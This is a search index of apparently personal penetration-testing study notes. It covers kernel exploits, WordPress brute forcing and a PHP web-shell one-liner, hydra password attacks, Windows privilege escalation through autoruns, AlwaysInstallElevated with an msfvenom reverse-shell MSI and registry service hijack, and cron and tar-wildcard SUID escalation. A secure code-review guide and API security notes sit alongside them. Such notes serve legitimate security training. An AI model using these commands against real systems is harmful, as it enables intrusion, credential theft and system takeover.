
{
  "searchindex": [

  {
    "title": "Kernel Exploits",
    "body": "Kernel Exploits \n Github Repo:  https://github.com/lucyoa/kernel-exploits Linux exploit suggester is a good tool for checking kernel exploits linux_exploit_suggester_2.pl -k <kernel version> Check Kernel Version: (NOTE 32 or 64 Bit for compilation) uname -a\nuname -r DirtyCow: gcc compile -o file\n./cow\npasswd \n gcc compile combinations to try: #TODO",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Kernel Exploits 599c7011b54042f18708c87ba2109e0b.html"
  },
  {
    "title": "Wordpress",
    "body": "Wordpress \n WPSCAN brute force proxychains wpscan --url http://localhost --wp-content-dir wp-admin --passwords /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt --usernames offsec -t 100 \n Wordpress: wp_config.php \u2192 credentials usually var/www/ or var/www/wordpress robots.txt wpscan: #enumrate users and vulnerable plugins\nwpscan --url <url> --api-token <token> -e u,vp\n\n#brute force\nwpscan --url <url> --api-token <token> -U <user> -P <pass list> -e enemurate u - users vp - vulnerable plugins api - <redacted> \n Search  var/www/wp-config.php for db passwords  \n Appearance \u2192 editor \u2192 index.php \u2192  <?php \nsystem($_GET['cmd']):",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Wordpress d8a66bfe60ba43e7b35b3b2bd74103ad.html"
  },
  {
    "title": "Enumerating APIs",
    "body": "Enumerating APIs \n Fuzzing APIs: We can fuzz APIs using Burp Suite Intruder or wfuzz. wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --sc 200 'http://0.0.0.0:5000/api/v1/resources/books?show=FUZZ'  \n Discovery via Source Code: \n we can run through the application using Burp and capture requests for all the functionality View JS files in the website. (Use JS formatter to make the code look pretty).",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Enumerating APIs d996df4f065d438abdb0aa4a1c1849f0.html"
  },
  {
    "title": "Information Gathering",
    "body": "Information Gathering \n Identify the target: find the scope of target EMail address gathering with hunter.io insert targets email pulls names and emails related to organization Gather credentials with breach-parse Can search thru 44g of breached credentials and try to find people credential stuffing: known passwords and various formattings for them Hunting subdomains: The harvester? crt.sh  (_website) Sublister apt install sublist3r http probe on found subdomains to see if theyre alive. builtwith.com  to see what a website is built with. Can also use Wappalyzer. can determine vulns with whats running on it. whatweb <website> 5. Burp Suite Burp is a web proxy (intercepts web requests) https://burp import certificate to firefox load website and head to burps proxy tab you can inspect and modify traffic We can get a lot of information about services from reading response requests. 6. google fu site:tesla.com -www -ir filetype: pdf, docx, csv, etc Social media Looking through social medias Look at company photos and SM you can find badges etc Can also use twitter or LI looking for people who work there create custom wordlists, emails etc from this information to gather credentials",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Information Gathering bb69aa1d3f944e2b87c12524556b9606.html"
  },
  {
    "title": "Registry Exploits/Autoruns",
    "body": "Registry Exploits/Autoruns Find things that run automatically see if we can escalate based off this things sys internal tools: autorun64.exe accesschk64.exe  Autoruns File must have allrun access. Manually: #Query the registry for AutoRun executables:\nreg query HKLM\\Software\\Policies\\Microsoft\\Windows\\CurrentVersion\\Run\n#OR\nreg query HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n#OR\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n#Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:\nC:\\accesschk.exe /accepteula -wvu \"C:\\Program Files\\Autorun Program\\program.exe\"\n#Copy the shell.exe executable you created and overwrite the AutoRun executable with it:\ncopy C:\\PrivEsc\\reverse.exe \"C:\\Program Files\\Autorun Program\\program.exe\" /Y\n#Start nc listener and restart machine Alternatively: #Open Autoruns64.exe from sysinternals and go to logon tab\n#note the image path of the desired autorun\n#Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:\nC:\\accesschk.exe /accepteula -wvu \"C:\\Program Files\\Autorun Program\\program.exe\"\n#notice that the \u201cEveryone\u201d user group has \u201cFILE_ALL_ACCESS\u201d permission\n#replace the existing program with our malicious exe\ncopy program.exe \"C:\\Program Files\\Autoruns\\program.exe\"\n#Log out and back in via RDP\n Steps to exploit: - upload malicious exe payload to machine\n- Replace the vulnerable program that we found\n- disconnect and come back to the user\n- Allow the program to run\n- Profit Powerup find autoruns allrun access: powershell -ep bypass\n\n.\\PowerUp.ps1\n\ninvoke-allchecks \n \n Always install elevated: establish user connection check if value is set to 1 in registry #Query the registry for AlwaysInstallElevated keys and see if they are set to 1:\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer\nreg query HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Installer\n#On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom.\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=0.0.0.0 LPORT=4444 -f msi -o reverse.msi\n#Start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges:\nmsiexec /quiet /qn /i C:\\PrivEsc\\reverse.msi Easy exploit: in powerup run: #Powerup found always installed elevated that we can run\nWrite-UserAddMSI run a adduser program to add a new user as an admin Harder: create msfvenom reverse shell payload executable and itll run as root giving you root shell. \n Registry Service Escalation: (regsvc) getACL command Powershell: powershell -ep bypass\nGet-Acl -Path hklm:\\System\\CurrentControlSet\\services\\regsvg | fl\n#note that user belongs to NT AUTHORITY\\INTERACTIVE and has FullControl permission over registry key\n#create a malicious executable to add a new admin user\nreg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\\temp\\x.exe /f\nsc start regsvc\nnet localgroups administrators",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Registry Exploits Autoruns 321fe93923b140e1b0fe71c15194461c.html"
  },
  {
    "title": "Password Attacks",
    "body": "Password Attacks Wordlist Creation: cewl -d 5 -m 9 www.test.com > test.txt crunch 3 3 -t %%% > numbers.txt /usr/lib/hashcat-utils/combinator.bin \n unshadow passwdfile shadowfile \u2192 john unshadow passwd shadow\njohn unshadow --wordlist=rockyou.txt --format=crypt Hash Conversion: \n Bruteforce: FTP hydra -t 3 ftp://IP -l user -P /usr/share/wordlists/rockyou.txt SSH hydra -l user -P /usr/share/wordlists/rockyou.txt <IP> ssh -s <port>\nhydra -l user -P common_pass.txt 0.0.0.0 ssh -t 4 HTTP hydra -l user -P /usr/share/wordlists/rockyou.txt -f <IP> http-get\nhydra -l user -P /usr/share/wordlists/rockyou.txt -f <IP> http-get\nhydra -l user -P /usr/share/wordlists/rockyou.txt -f <IP> http-post-form \"/endpoint.php:username=user&password=^PASS^:Invalid password prompt\" RDP crowbar -b rdp -s 0.0.0.0/32 -u admin -C ~/password-file.txt -n 1 HTACCESS medusa -h 0.0.0.0 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin \n https://www.base64decode.org/ https://cryptii.com/pipes/hex-decoder https://hashes.com/en/tools/hash_identifier",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Password Attacks 1541fafec7b54e61a66eca8590f81cce.html"
  },
  {
    "title": "Code Review",
    "body": "Code Review ###WARNING: NOTES UNDER CONSTRUCTION OWASP Code review guide -  https://owasp.org/www-project-code-review-guide/ Vulnerable packages -  https://security.snyk.io/ OWASP Guide Notes Checklists Python Go Javascript Java (Android) MITRE 1 Injection: \n Vulnerable SQL Injection: result = conn.db.cursor().execute(\n                \"DELETE FROM providers WHERE providerID='\" + provider_id + \"'\"\n            ) Fix: conn = Connect()\n            result = conn.db.cursor().execute(\n                \"\"\"\n                DELETE FROM providers WHERE providerID=%(id)s AND EXISTS (\n                    SELECT providerID FROM (\n                        SELECT providerID FROM providers WHERE providerID=%(id)s\n                    ) AS tmp\n                )\n                \"\"\", {'id': provider_id \n A2 Broken Authentication And Session Management: A3 Cross-Site Scripting (XSS): A4 Insecure Direct Object Reference: A5 Security Misconfiguration: A6 Sensitive Data Exposure: A7 Missing Function Level Access Control: A8 Cross-Site Request Forgery (CSRF): A9 Using Components With Know Vulnerabilities: A10 Unvalidated Redirects And Forwards: \n Input Allow Listing Input Allow Listing  also known as Input Validation or Input Sanitization is a tenet of application security. \n    It is the single most important countermeasure that will prevent a large amount of attacks. Here are a few of the SANS 25 that are prevented or at least \nmitigated through Input Allow Listing. \n    Even if allow listing cannot be employed in some cases, if used for \nmost inputs it reduces the attack surface and the risk to the \napplication. URL Redirection to Untrusted Site ('Open Redirect') -- allow only specified urls Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') -- allow only alphanumeric Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')  -- allow only alphanumeric or allow only specified files Unrestricted Upload of File with Dangerous Type -- allow only safe file extensions Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') -- allow only alphanumeric Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') -- allow only alphanumeric Buffer Copy without Checking Size of Input ('Classic Buffer Overflow') -- limit size Input Allow Listing vs. Input Block Listing The choice of using the term 'Allow Listing' instead of 'Validation'\n or 'Sanitization' was made to differentiate from the bad kind of \nvalidation: 'Block Listing'. Block listing involves blocking certain strings or characters. It \ncan almost always be defeated by skilled attackers. \n    You'd think it's better than nothing but you'd be wrong. Block \nlisting masks vulnerabilities for automated tools and testers that are \nless skilled. The example below tries to prevent a command injection attack (inspired from a real life scenario, the  ImageTragik bug  - translated to Java from C++)     String location=request.getParameter(\"location\");\n    if(location.indexOf(\";\")!=-1){\n        throw new Exception(\"Invalid character in location\"); //prevent adding commands to wget using the ; character: location=www.google.com;ls -la\n    }\n    else{\n        Runtime.getRuntime().exec(\"/bin/sh -c 'wget \"+location+\"'\");\n    }\n The attacker can still inject commands without the ; symbol, for example they can use the ` character:  location=www.google.com`ls -la` Input Allow Listing Rules All user input should be considered unsafe by default. The majority of input used in an application ends up being numeric or alphanumeric strings. \n    Even when other characters are required they are usually part of a limited set. \n    So only alphanumeric characters should be allowed by default while other can be added on exception. The example below implements input allow listing     public static boolean isAlphanumOrExcepted(in maxSize, String val, char ... excepted){\n        boolean result = true;\n        int count = val.length();\n        if(count>maxSize) return false;\n\n        for(int i=0;i<count;i++){\n        \tchar c = val.charAt(i);\n        \tboolean isOk = false;\n        \t//if  alphabetic turns true , this works for Unicode chars\n        \tisOk = isOk | Character.isAlphabetic(c);\n        \t//if it's a digit turns true, this works for Unicode chars\n        \tisOk = isOk | Character.isDigit(c);\n        \t//if it's in the list of exceptions turns true\n        \tfor(char ex : excepted){\n        \t\tisOk = isOk | ex==c;\n        \t}\n\n        \tif(isOk == false){ //if the character didn't meet the requirements return false\n        \t\treturn false;\n        \t}\n        }\n        return result;\n    }\n    //...\n    String location=request.getParameter(\"location\");\n    if(isAlphanumOrException(32, location,':','/','?')){\n        Runtime.getRuntime().exec(\"/bin/sh -c 'wget \"+location+\"'\"); //btw there is a better way to call shell commands which reduces the risk of command injection, see parameterized commands code block\n    }\n    else{\n        throw new Exception(\"Invalid character in location\"); //only allow a limited set of valid url characters\n    }\n In Node.js there's a handy validator package containing various validation techniques Input Allow Listing as a Framework If possible allow listing should be built into the \nAPI or Framework. \n    Ideally a new developer writing a new REST API should automatically \nbenefit from allow listing and only add extra characters or symbols as \nneeded. This can be done by introducing allow listing as part of the default\n data processing routines. \n    At a minimum a common validation class should be made available and \nused every time user input is accepted and be enforced as part of coding\n guidelines. The example below shows the implementation of a 'SafeGetParameter' function that can be reused to ensure validation      String userId=Util.SafeGetParameter(32,request,\"userId\",ValidatorConstants.ALPHA_NUM);\n Injection: Use Parameterized Commands This code block protects against Injection weaknesses such as  OS Command Injection  and  SQL Injection The most common types of commands used by software are OS Commands and SQL Commands. \nParameterizing a command involves passing user input as command arguments rather than constructing a literal statement. The unsafe way of constructing a command is by concatenating user input. Concatenation allows injection. Parameterized SQL Commands Here is the correct way of executing a database query using prepared statements. String query = \"SELECT * FROM users WHERE usr =? AND pwd=?\";\n    PreparedStatement ps = conn.preparedStatement(query);\n    stmt.setString(1, usr);\n    stmt.setString(2, pwd);\n    ResultSet rs = ps.executeQuery(query);\n Note: Prepared statements will not protect against situations when the input is being again concatenated in an SQL Procedure. \nInput validation or moving the SQL logic into the middleware can prevent against those cases. Parameterized OS Commands Java conveniently offers a safe way to execute commands. The following example shows executing the  ping  utility with arguments.     String server = req.getParameter(\"server\");\n    String [] commandArgs = {\"-c\",\"1\",server};\n    Process p = Runtime.getRuntime().exec(\"ping\",commandArgs);\n Keep in mind that this safe method won't protect from situations where the arguments are passed as an argument to the shell. \nThis type of code below should be avoided.     String server = req.getParameter(\"server\");\n    String [] commandArgs = {\"-c\", String.format(\"ping -c 1 %s\",server)};\n    Process p = Runtime.getRuntime().exec(\"/bin/sh\",commandArgs);\n Also the method will be useless when shell scripts, python, perl etc are\n called with the arguments. The injection may occur in the shell script. Input Allow Listing can prevent those situations. \n \n Safe Memory Management:  Safe Memory Management Follow this set of secure coding practices to prevent memory attacks. Use functions that limit the input size fgets(\u2026) allows limits the size of the input;  fgets(userPass, BUFF_SIZE, stdin) . \nOther such functions are strncpy, snprintf and strncmp. Check that the size of the input matches the size of the allocated memory. Even with the use of a \"safe function\" buffer overflow can still occur \nif the size argument is larger than the size of the buffer. Avoid \nmistakes by using constants for memory allocation and controlling \nboundaries. \nPay close attention to comparison operators. Do not allow input as format string arguments. If the user input is used in the format string portion of format string \narguments this can lead to data leakage and even altering of memory \nintegrity. Safe releasing memory Memory issues don't only occur when allocating and constructing buffers. They also occur if memory is released unsafely.\n    Use-after-free is another type of flaw where one portion of the code frees the memory and allocates it to a new variable\n    however a different area of the code still uses that variable. This can lead to data leakage and crashes. Safe compiler flags Compiler flags enable operating system defences such\n as ASLR in Windows or PIE/SSP in Linux. \n    They tell the operating system to employ countermeasures such as \nrandomizing memory, which is making it hard for attackers to insert \narbitrary code. Even with compiler flags in place attackers can still crash the \nprogram so the main effect of compiler flags is reducing the impact of \nthe attack. \n        The best defence is to prevent the flaws in the code, from the \nstart, by employing the best practices discussed in this article. \n \n Use Strong Data Encryption This code block protects against software weaknesses such as Missing Encryption of Sensitive Data Use of a Broken or Risky Cryptographic Algorithm Use of a One-Way Hash without a Salt \"When there is a need to store or transmit\n sensitive data, use strong, up-to-date cryptographic algorithms to \nencrypt that data. \n       Select a well-vetted algorithm that is currently considered to be\n strong by experts in the field, and use well-tested implementations. \n       \n       ...\n       \n        Do not develop custom or private cryptographic algorithms. They \nwill likely be exposed to attacks that are well-understood by \ncryptographers. \n        Reverse engineering techniques are mature. If the algorithm can \nbe compromised if attackers find out how it works, then it is especially\n weak.\n        Periodically ensure that the cryptography has not become \nobsolete. Some older algorithms, once thought to require a billion years\n of computing time, can now be broken in days or hours. \n        This includes MD4, MD5, SHA1, DES, and other algorithms that \nwere once regarded as strong.\" From MITRE  CWE 327 Encryption of data at rest Sensitive data stored locally should be encrypted to prevent both \nagainst physical theft and data leakage attacks. Sensitive data includes\n but not limited to: personally identifiable information (PII),\npasswords, confidential business information. The industry standard is to consider all passwords and encryption keys sensitive data. \nUser passwords should stored irreversible and be hashed using a salted adaptive algorithm. System passwords such as passwords to a database or LDAP server should \nbe encrypted with a strong cryptographic algorithm and using a \ndynamically generated key or a key obtained from a Hardware Security \nModule.\nSame approach should be taken for other data such as PII or confidential\n information. The table below lists approved algorithms for various types of data Type of data Approved algorithm Preferred algorithm DO NOT USE User passwords Salted SHA-2 class (SHA256 and up) Salted PBKDF2 with large number of rounds MD5, SHA1, Unsalted Reversible sensitive data Symmetric - AES256 CBC with dynamic key/iv (HSM), Asymmetric - RSA 2048 -- RSA claims that 1024 bit keys, no longer safe Symmetric - AES256 CTR or stronger with dynamic key (HSM), Asymmetric - RSA 4096 {xor},DES,AES 256 ECB for large data, hardcoded keys Sample hashing of a password using PBKDF2 /**\n* Generates the PBKDF hash for the string\n* @param password The password to be hashed\n* @param salt The salt used to make the password unknown to password cracking dictionaries\n* @param iterations The number of times to repeat the hashing algorithm on the resulting digest. Used to increase the time required to crack a passwords. The higher the number the longer the time required to crack.\n* @param derivedKeyLength The length of the resulting hash for example 64\n* @return\n* @throws NoSuchAlgorithmException\n* @throws InvalidKeySpecException\n*/\npublic static String getEncryptedPassword(String password, byte[] salt,  int iterations,  int derivedKeyLength) throws NoSuchAlgorithmException, InvalidKeySpecException {\n    KeySpec spec = new PBEKeySpec(password.toCharArray(), salt, iterations, derivedKeyLength * 8);\n\n    SecretKeyFactory f = SecretKeyFactory.getInstance(\"PBKDF2WithHmacSHA256\");\n\n    byte[] hashBytes f.generateSecret(spec).getEncoded();\n\n    return Base64.getEncoder().encodeToString(hashBytes);\n}\n Encryption of data in transit It has become an industry standard to secure all communications. It is \nconsidered a vulnerability to send data in clear text (like in the case \nof the http:// urls). Other vulnerabilities\ninclude using flawed protocols or ciphers in the communication.\n\nIt is also a vulnerability to ignore invalid server certificates.\n\nHere is a list of the few notable vulnerablity disclosures in SSL/TLS \nprotocols and ciphers over the past few years. Bacronym Vulnerable Protocol or Cipher Reference POODLE SSLv3 Wikipedia article FREAK RSA_EXPORT keys Wikipedia article Logjam Diffie-Hellman key exchange Wikipedia article Protocol and cipher issues are addressed in the server configuration and the configuration of communication clients.\n\nThe public site SSLLabs allows users to test any public server for secure communication issues. \n \n Neutralize Output This software defense prevents the many flavours of  Cross-Site Scripting First if you want to get an idea of the challenges associated with fixing XSS, watch the following public video: \n How Fixing Cross-Site Scripting is Like Playing Whack-A-Mole There are several proven ways to ensure the user input doesn't \"pop\". Output Encoding This technique is best fit for pages that are generated on the server side, like in the case of JSP, PHP or ASP.\n    The HTML Encoding example below shows how HTML markup is neutralized by replacing special characters with their corresponding HTML Entities. User input: '\"/><script>alert(1)</script> Java EE using Apache Commons Lang - notice additional escaping was added for single quote since &apos; is not yet considered a valid entity StringEscapeUtils.escapeHtml4(request.getParameter(\"userId\")).replace(\"'\", \"&#39;\");\n Html source: &#39;&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt; Rendered page: '\"/><script>alert(1)</script> Enforce the UTF8 charset The output encoding countermeasure can be bypassed through alternate \nencoding attacks.\nEnforcing the charset prevents such attacks. \nIf the charset of the page is not set, the browser will default to auto \ndetect and strings that would normally be harmless would become \nexecutable. The example below shows how the charset can be enforced using an HTTP header.     Content-type: text/html; charset=UTF8. Safe DOM Updates Modern applications have moved the UI handling to client side \ntechnologies such as React, Angular or JQuery, which have become very \npopular. In such applications the danger lies in dynamic updates of the innerHTML\n attribute. The contentText/innerText attribute should be used instead, \nlike in the case of using the \n .text(text)  function in jQuery.\nA better approach to UI design in modern applications is using widgets or templates. \n\nThe example below is from this page, which uses AngularJS. <h3>Hi {{firstName}}! Your level is: '{{userLevelString}}' </h3>\n<p>\nComplete the challenges below to advance to the next level. Click on the challenge name to get more info.</p>\n\n Avoid Unsafe JavaScript functions Don't use  eval() . Avoid  setTimeout/setInterval . Do not construct JavaScript function names dynamically. Mitigations These measures can reduce the impact of a XSS attack. X-XSS-Protection: 1; mode=block  enforces the browser XSS filter, not supported by all browsers Content-Security-Policy: script-src \u2018self\u2019  prevents\nthe loading of external scripts, requiring the attacker to use large\ninline payloads. When possible the header is also an effective mitigation against:\n\"Inclusion of Functionality from Untrusted Control Sphere\" when\npossible. \n Dangerous HTML element attributes: innerHTML src onLoad, onClick, etc\u2026 Dangerous functions: eval setTimeout setInterval \n \n \n Indirect Object References This code block can prevent several issues from the MITRE Top 25 list. URL Redirection to Untrusted Site ('Open Redirect') Unrestricted Upload of File with Dangerous Type Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') Using  indirect object references  \n(as opposed to direct object references) means that the user input is \nmanipulated\non the server side and compared to a list or a hashmap. The example \nbelow shows a hashmap of file resources for a server containing \ndocuments. Resource ID File Name 2543626326753473534754334347753434573 /var/www/myapp/files/docs/accounts.xls 9789694693274976937629462958605603862 /var/www/myappfiles/docs/proposal.doc When the application retrieves the file rather than using the actual \nfile name, it uses the resource id and keeps the actual file location \nsecret and immutable.\nIf the user attempts to manipulate the resource id it will have no \neffect.     String resourceId = Util.SafeGetParameter(request,\"resourceId\",ValidatorConstant.NUMERIC);\n    if(resourceId!=null){\n        BufferedReader fileReader = FileManager.mapResourceIdToFile(resourceId);\n    }\n During file upload, the application should ignore the file name provided by the user and replace it with a GUID. \n    This mitigates against both Path Traversal and Upload of Dangerous File Types. If the user provided file name must be maintained, like in the case of unzipping, \n    then the application should validate that the absolute file name resolves to an allowed directory. In a similar way indirect object references can be used for URL \nredirects either by maintaining a hashmap or by manipulation on the \nserver side that will neutralize\n    any non relative URLs. \n Checklist: CATEGORY DESCRIPTION PASS/FAIL General Are there backdoor/unexposed business logic classes? Authorization Is the placement of authentication and authorization check correct? Authorization Are the checks correct implemented? Is there any backdoor parameter? Authorization Is the check applied on all the required files and folder within web root directory? Authorization Are security checks placed before processing inputs? Authorization Incase of container-managed authentication - Is the authentication based on web methods only? Authorization Is Password Complexity Check enforced on the password? Cryptography Is password stored in an encrypted format? Authorization Is password disclosed to user/written to a file/logs/console? Business Logic and Design Are there unused configurations related to business logic? Business Logic and Design If request parameters are used to identify business logic methods, is there a proper mapping of user privileges and methods/actions allowed to them? Business Logic and Design Check if unexposed instance variables are present in form objects that get bound to user inputs. If present, check if they have default values. Business Logic and Design Check if unexposed instance variables present in form objects that get bound to user inputs. If present, check if they get initialized before form binding. Authorization Is there execution stopped/terminated after for invalid request? I.e. when authentication/authorization check fails? Business Logic and Design Check if unexposed instance variables are present in form objects that get bound to user inputs. If present, check if they have default values. Business Logic and Design Check if unexposed instance variables present in form objects that get bound to user inputs. If present, check if they get initialized before form binding. Authorization Is there execution stopped/terminated after for invalid request? I.e. when authentication/authorization check fails? Business Logic and Design Are the checks correct implemented? Is there any backdoor parameter? Business Logic and Design Is the check applied on all the required files and folder within web root directory? Business Logic and Design Is there any default configuration like Access- ALL? Business Logic and Design Does the configuration get applied to all files and users? Authorization Incase of container-managed authentication - Does the authentication get applied on all resources? Session Management Does the design handle sessions securely? Cryptography Are database credentials stored in an encrypted format? Business Logic and Design Does the design support weak data stores like flat files Business Logic and Design Does the centralized validation get applied to all requests and all the inputs? Business Logic and Design Does the centralized validation check block all the special characters? Business Logic and Design Does are there any special kind of request skipped from validation? Business Logic and Design Does the design maintain any exclusion list for parameters or features from being validated? Input Validation Are all the untrusted inputs validated? Input data is constrained and validated for type, length, CATEGORY DESCRIPTION PASS/FAIL Cryptography Are cryptographic functions used by the application the most recent version of these protocols, patched and process in place to keep them updated? General Are external libraries, tools, plugins used by the application functions the most recent version of these protocols, patched and process in place to keep them updated? Cryptography Does are there any special kind of request skipped from validation? User Management and Authentication User and role based privileges are documented User Management and Authentication Authentication cookies are not persisted User Management and Authentication Authentication cookies are encrypted User Management and Authentication Authentication credentials are not passed by HTTP GET User Management and Authentication Authorization checks are granular (page and directory level) User Management and Authentication Authorization based on clearly defined roles User Management and Authentication Access control checks performed before displaying sensitive data or functionality User Management and Authentication Password reset process includes user verification User Management and Authentication Password reset process requires users to change their password upon first login User Management and Authentication Password reset process is rate-limited to prevent abuse Session Management Session cookies are marked as \"Secure\" and \"HttpOnly\" Session Management Sessions are invalidated upon logout or timeout Session Management Sessions are invalidated upon password reset Session Management Sessions are invalidated upon detection of suspicious activity Input Validation Input data is constrained and validated for type, length, format, and range. Logging and Auditing Are logs logging personal information, passwords or other sensitive information? Logging and Auditing Do audit logs log connection attempts (both successful and failures)? Logging and Auditing Is there a process(s) in place to read audit logs for unintended/malicious behaviors? Cryptography Is all PI and sensitive information being sent over the network encrypted form. Authorization Does application design call for server authentication (anti-spoofing measure)? Authorization Does application support password expiration? Cryptography Does application use custom schemes for hashing and or cryptographic? General Classes that contain security secrets (like passwords) are only accessible through protected API\u2019s General Keys are not held in code. General Plain text secrets are not stored in memory for extended periods of time. General Array bounds are checked. General All sensitive information used by application has been identified",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Code Review 063b90ddc6124adfb6a71739e97120ad.html"
  },
  {
    "title": "Scheduled Tasks",
    "body": "Scheduled Tasks See cronjobs: cat /etc/crontab Systemd timers: Payloads all the things if we cant manually see cronjobs systemctl list-timers -all Overwriting cron paths: #payload\necho 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh wait for the cronjob to execute again... /tmp/bash -p Cron wildcards: we can inject code through * (wildcards) Commands depend on the program being ran by the cronjob For tar wildcards: create a reverse shell:  shell.sh echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh\ntouch /home/user/dir/--checkpoint=1\ntouch /home/user/dir/--checkpoint-action=exec=sh\\shell.sh\n/tmp/bash -p Another common escalation: When you see files running a cronjob Overwrite cronjob with reverse shells...",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Scheduled Tasks 3e54086db79548d18a24d30c9dc7a298.html"
  },
  {
    "title": "9. Security Logging & Monitoring Failures",
    "body": "9. Security Logging & Monitoring Failures https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/ \n \n Things to look for: CWE-117 Improper Output Neutralization for Logs CWE-223 Omission of Security-relevant Information CWE-532 Insertion of Sensitive Information into Log File CWE-778 Insufficient Logging",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/9 Security Logging & Monitoring Failures d89aa15c739e4204a8e7d91f5ebf3d60.html"
  },
  {
    "title": "ETC",
    "body": "ETC Random one off protocols, commands, and tools\u2026 \n Useful Links: https://www.base64decode.org/ https://cryptii.com/pipes/hex-decoder https://hashes.com/en/tools/hash_identifier https://crackstation.net/ \n Upgrading Shells: python -c 'import pty; pty.spawn(\"/bin/sh\")'\npython3 -c 'import pty; pty.spawn(\"/bin/sh\")'\n\n--------------\nstty raw -echo: fg\nexport TERM=xterm\nstty -a rows 52 cols 165 \n Flag Hunting: Flag names: proof.txt\n\nflag.txt\n\nlocal.txt\n\nroot.txt\n\nflag.ps1 \n Windows commands: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md#eop---looting-for-passwords dir proof.txt /s\ndir /s /p proof.txt\ndir /x \nipconfig /all \n powershell -ep bypass\ntree /f | Select-String flag.ps1 -Context 7,7\ncd C:/ | gci -recurse | findstr /s flag.txt \n Linux commands: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Linux - Privilege Escalation.md#looting-for-passwords \n Sunrpc rpcinfo -s 0.0.0.0 msrpc: rpcclient -U 'uname%pass' (IP)\nrpcclient -U \"\" -N -c <command> <target_system>\nrpcclient -U <username> <target_system>\ncheck hacktricks RPC: (111) rpcdump -s <target_system>\nrpcinfo -p <target_system>\nnmap -sV -p 111 <target_system> NNTP (119): nc -nvC 0.0.0.0 119\nHELP\nLIST Finger: #user enumeration\nfinger @IP\n\nperl finger_user_emum.pl\n\nperl finger_user_emum.pl -U /usr/share/seclists/users.txt -t <IP>",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/ETC 73865e412e554583ae296223188792c4.html"
  },
  {
    "title": "API Security Basics",
    "body": "API Security Basics  Headers: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers \n Information Disclosure: Information may be disclosed in API responses or public sources such as\ncode repositories, search results, news, social media, the target\u2019s website,\nand public API directories. \n Broken Object Level Authorization BOLA vulnerabilities occur when an API provider allows an\nAPI consumer access to resources they are not authorized to access. In general, you can test for BOLAs by understanding how an API\u2019s\nresources are structured and attempting to access resources you shouldn\u2019t\nbe able to access. By detecting patterns within API paths and parameters,\nyou should be able to predict other potential resources. The bolded elements in the following API requests should catch your attention: \nGET /api/resource/1\nGET /user/account/find?user_id=15\nPOST /company/account/Apple/balance\nPOST /admin/pwreset/account/90 In these instances, you can probably guess other potential resources,\nlike the following, by altering the bolded values: GET /api/resource/3\nGET /user/account/find?user_id=23\nPOST /company/account/Google/balance\nPOST /admin/pwreset/account/111 \n Broken User Authentication Broken user authentication refers to any weakness within the API authentication process. These vulnerabilities typically occur when an API provider either doesn\u2019t implement an authentication protection mechanism or implements a mechanism incorrectly. \n Excessive Data Exposure Excessive data exposure is when an API endpoint responds with more information than is needed to fulfill a request. \n Lack of Resources and Rate Limiting \n \n Broken Function Level Authorization \n \n Mass Assignment Imagine an API is called to create an account with parameters for \"User\" and \"Password\": {\n\"User\": \"scuttleph1sh\",\n\"Password\": \"GreatPassword123\"\n} While reading the API documentation regarding the account creation\nprocess, suppose you discover that there is an additional key, \"isAdmin\", that\nconsumers can use to become administrators. You could use a tool like\nPostman or Burp Suite to add the attribute to a request and set the value\nto true: {\n\"User\": \"scuttleph1sh\",\n\"Password\": \"GreatPassword123\",\n\"isAdmin\": true\n} If the API does not sanitize the request input, it is vulnerable to mass\nassignment, and you could use the updated request to create an admin\naccount. On the backend, the vulnerable web app will add the key/value\nattribute, {\"isAdmin\":\"true\"}, to the user object and make the user the equivalent of an administrator. \n Security Misconfigurations",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/API Security Basics 4a98f4189c3e472ea504f8050998e697.html"
  },
  {
    "title": "IOS Dynamic Analysis",
    "body": "IOS Dynamic Analysis",
